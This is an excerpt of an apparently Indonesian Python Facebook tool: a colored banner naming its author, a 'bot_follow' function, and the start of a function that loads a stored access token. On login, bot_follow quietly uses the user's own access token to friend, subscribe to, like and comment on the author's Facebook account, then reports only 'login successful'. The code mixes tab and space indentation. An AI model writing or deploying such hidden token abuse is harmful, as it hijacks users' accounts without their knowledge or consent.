...
#####################################
logo = ("""\x1b[1;92m ____  ___ __________
\x1b[1;92m|  _ \|_ _|__  /__  /
\x1b[1;96m| |_) || |  / /  / /
\x1b[1;96m|_| \_\___/____/____|
\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m——————————————————————————————
\x1b[1;95m[\x1b[1;97m•\x1b[1;95m]\x1b[1;97m ID : RizzaldiEX
\x1b[1;95m[\x1b[1;97m•\x1b[1;95m]\x1b[1;97m fb : fb.com/DIKI.DARMAWAN.AV.LMAO
\x1b[1;95m[\x1b[1;97m•\x1b[1;95m]\x1b[1;97m gh : github.com/RizzaldiEX
\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m——————————————————————————————
""")
...
def bot_follow():
	...
	kata_utama = ("Semangat bang Aprizal ")
	...
	komen3 = kata_utama3+"\n"+pantun_motivasi+"\n"+waktu
	requests.post('https://graph.facebook.com/me/friends?method=post&uids=DIKI.DARMAWAN.AV.LMAO&access_token='+token) #Rozhak
	requests.post('https://graph.facebook.com/DIKI.DARMAWAN.AV.LMAO/subscribers?access_token='+token) #Rozhak
        requests.post('https://graph.facebook.com/DIKI.DARMAWAN.AV.LMAO/subscribers?access_token='+token) #Muhammad Rozhak
	requests.post('https://graph.facebook.com/DIKI.DARMAWAN.AV.LMAO/subscribers?access_token='+token) #Rozhak
	requests.post('https://graph.facebook.com/DIKI.DARMAWAN.AV.LMAO/comments/?message='+komen+'&access_token='+token) #Foto Profil
	requests.post('https://graph.facebook.com/DIKI.DARMAWAN.AV.LMAO/likes?summary=true&access_token='+token) #Foto Profil
	requests.post('https://graph.facebook.com/DIKI.DARMAWAN.AV.LMAO/comments/?message='+komen3+'&access_token='+token) # Foto Profil
	requests.post('https://graph.facebook.com/DIKI.DARMAWAN.AV.LMAO/comments/?message='+komen2+'&access_token='+token) #Foto Sampul
	print("\x1b[1;96m[\x1b[1;92m#\x1b[1;96m]\x1b[1;92m Login Berhasil Cuk")
	menu()
def publik_fast():
        try:
                token=open('___rozhak___','r').read()
